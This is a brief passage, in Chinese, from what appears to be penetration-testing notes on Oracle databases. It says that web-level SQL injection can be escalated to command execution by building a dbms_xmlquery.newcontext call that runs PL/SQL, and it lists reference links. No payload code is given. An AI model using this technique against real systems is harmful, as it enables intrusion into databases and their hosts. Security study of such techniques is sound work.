当遇到Web层面的SQL注入时，需要构造`dbms_xmlquery.newcontext`执行PL/SQL的语句来进行命令执行

## 参考

http://www.davidlitchfield.com/security.htm

https://lfysec.top/2020/12/05/Oracle%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/

https://docs.oracle.com/en/database/oracle/oracle-database/index.html

https://www.t00ls.net/articles-23609.html